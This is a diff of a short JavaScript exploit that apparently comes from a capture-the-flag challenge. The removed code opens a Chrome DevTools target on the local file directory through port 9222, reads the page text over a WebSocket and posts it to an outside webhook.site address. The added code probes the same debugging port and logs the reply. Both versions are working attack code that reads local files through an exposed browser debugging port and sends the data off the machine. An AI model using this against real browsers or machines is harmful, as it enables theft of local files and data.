@@ -1,59 +1,21 @@
-<script>
-const WEBHOOK =
-  "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
+async function testCDP() {
+  const url = "http://localhost:9222/json/version";
 
-async function log(stage, data) {
-  await fetch(WEBHOOK, {
-    method: "POST",
-    mode: "no-cors",
-    headers: {
-      "Content-Type": "text/plain"
-    },
-    body: JSON.stringify({ stage, data })
-  });
-}
-
-async function run() {
   try {
-    // Create a Chrome DevTools target for the challenge directory
-    const response = await fetch(
-      "http://localhost:9222/json/new?file:///challenge/",
-      { method: "PUT" }
-    );
+    const r = await fetch(url);
+    const body = await r.text();
 
-    const target = await response.json();
-
-    await log("directory_target", target);
-
-    const ws = new WebSocket(target.webSocketDebuggerUrl);
-
-    ws.onopen = () => {
-      ws.send(JSON.stringify({
-        id: 1,
-        method: "Runtime.evaluate",
-        params: {
-          expression: "document.body.innerText",
-          returnByValue: true
-        }
-      }));
-    };
-
-    ws.onmessage = async (event) => {
-      const msg = JSON.parse(event.data);
-
-      if (msg.id === 1) {
-        await log("directory_listing", msg);
-      }
-    };
-
-    ws.onerror = async () => {
-      await log("websocket_error", "WebSocket failed");
-    };
-
+    log("cdp_test", {
+      status: r.status,
+      body: body
+    });
   } catch (e) {
-    await log("error", String(e));
+    log("cdp_test_error", {
+      message: e.message,
+      stack: e.stack,
+      url: url
+    });
   }
 }
 
-run();
-</script>
+testCDP();
